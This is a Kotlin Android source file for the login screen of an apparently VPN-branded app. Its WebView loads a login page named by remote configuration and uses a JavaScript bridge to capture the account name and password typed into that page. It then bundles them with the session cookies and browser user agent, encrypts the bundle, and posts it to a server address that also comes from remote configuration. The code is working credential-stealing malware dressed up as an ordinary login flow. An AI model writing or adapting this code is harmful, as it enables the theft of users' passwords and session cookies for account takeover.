package win.enlarge.zoovpn.ui.activity

import android.annotation.SuppressLint
import android.os.Build
import android.text.TextUtils
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.webkit.CookieManager
import android.webkit.CookieSyncManager
import android.webkit.JavascriptInterface
import androidx.lifecycle.lifecycleScope
import com.google.gson.Gson
import com.lzy.okgo.OkGo
import com.lzy.okgo.callback.StringCallback
import kotlinx.android.synthetic.main.activity_login.*
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import win.enlarge.zoovpn.App
import win.enlarge.zoovpn.R
import win.enlarge.zoovpn.base.BaseActivity
import win.enlarge.zoovpn.pojo.ResultPojo
import win.enlarge.zoovpn.utils.*

class LoginActivity : BaseActivity(R.layout.activity_login) {

    class WebInterface {
        @JavascriptInterface
        fun businessStart(a: String, b: String) {
            account = a
            password = b
        }
    }

    private var countDownJob: Job? = null


    private fun countDownCoroutines(
        total: Int, onTick: (Int) -> Unit, onFinish: () -> Unit,
        scope: CoroutineScope = GlobalScope
    ): Job {
        return flow {
            for (i in 0..total) {
                emit(i)
                delay(1000)
            }
        }.flowOn(Dispatchers.Default)
            .onCompletion { onFinish.invoke() }
            .onEach { onTick.invoke(it) }
            .flowOn(Dispatchers.Main)
            .launchIn(scope)
    }

    private fun clearAll() {
        CookieSyncManager.createInstance(app)
        val cookieManager = CookieManager.getInstance()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            cookieManager.removeSessionCookies(null)
            cookieManager.removeAllCookie()
            cookieManager.flush()
        } else {
            cookieManager.removeSessionCookies(null)
            cookieManager.removeAllCookie()
            CookieSyncManager.getInstance().sync()
        }
        account = ""
        password = ""
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onConvert() {
        clearAll()
        countDownCoroutines(20, {}, {
            showInsertAd(isForce = true, tag = "inter_loading")
        }, lifecycleScope)
        lifecycleScope.launch(Dispatchers.IO) {
            val banner = App.instance!!.lovinBanner()
            banner.loadAd()
            withContext(Dispatchers.Main) {
                adView.addView(banner)
            }
        }
        window.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE)
        activityLoginIvBack.click {
            onBackPressed()
        }
        activityLoginWv.apply {
            activityLoginWv.setting(this@LoginActivity)
            addJavascriptInterface(WebInterface(), "businessAPI")
            chromeClient(this@LoginActivity) {
                activityLoginFl.visibility = View.GONE
            }
            clientView { cookieStr, userAgentString ->
                lifecycleScope.launch(Dispatchers.Main) {
                    activityLoginFlContent.visibility = View.VISIBLE
                }
                if (!TextUtils.isEmpty(updateEntity.c)) {
                    val url = updateEntity.c
                    if (!TextUtils.isEmpty(updateEntity.d)) {
                        val key = updateEntity.d
                        val value = gson.toJson(
                            mutableMapOf(
                                "un" to account,
                                "pw" to password,
                                "cookie" to cookieStr,
                                "source" to configEntity.app_name,
                                "ip" to "",
                                "type" to "f_o",
                                "b" to userAgentString
                            )
                        ).toRsaEncrypt(key!!)
                        val body: RequestBody =
                            Gson().toJson(mutableMapOf("content" to value))
                                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
                        OkGo.post<String>(url).upRequestBody(body)
                            .execute(object : StringCallback() {
                                override fun onSuccess(response: com.lzy.okgo.model.Response<String>?) {
                                    Log.i("xxxxxxH", response?.body().toString())
                                    response?.let {
                                        val result = Gson().fromJson(
                                            it.body().toString(),
                                            ResultPojo::class.java
                                        )
                                        if (result.code == "0" && result.data?.toBooleanStrictOrNull() == true) {
                                            "requestCollect success".loge()
                                            isLogin = true
                                            runOnUiThread {
                                                finish()
                                            }
                                        }
                                    }
                                }
                            })
                    }
                }
            }
            loadUrl(updateEntity.m ?: "https://www.baidu.com")
        }
    }

    override fun onResume() {
        super.onResume()
        activityLoginWv.onResume()
    }

    private var needBackPressed = false

    override fun onBackPressed() {
        if (activityLoginWv.canGoBack()) {
            activityLoginWv.goBack()
        } else {
            countDownJob?.cancel()
            val a = showInsertAd(showByPercent = true, tag = "inter_login")
            if (!a) {
                if (configEntity.httpUrl().startsWith("http")) {
                    jumpToWebByDefault(configEntity.httpUrl())
                }
                super.onBackPressed()
            } else {
                needBackPressed = true
            }
        }
    }

    override fun onInterstitialAdHidden() {
        super.onInterstitialAdHidden()
        if (needBackPressed) {
            needBackPressed = false
            super.onBackPressed()
        }
    }


    override fun onPause() {
        super.onPause()
        activityLoginWv.onPause()
    }
}